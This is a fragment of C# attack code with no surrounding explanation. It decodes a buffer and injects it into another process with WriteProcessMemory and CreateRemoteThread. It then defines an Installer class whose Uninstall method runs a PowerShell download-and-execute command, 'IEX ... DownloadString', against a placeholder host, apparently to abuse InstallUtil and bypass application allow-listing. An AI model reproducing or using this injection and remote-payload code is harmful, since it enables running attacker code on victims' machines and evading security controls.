byte[] decoded = decoder(buf, 2, 0xFF);

IntPtr outSize;
WriteProcessMemory(hProcess, addr, decoded, buf.Length, out outSize);

IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer

{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
	String cmd1 = "IEX (New-Object System.Net.WebClient).DownloadString('http://X.X.X.X/run.txt')";
    Runspace rs = RunspaceFactory.CreateRunspace();
    rs.Open();

        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;

        ps.AddScript(cmd1);
	ps.Invoke();

	rs.Close();
	}
}
}
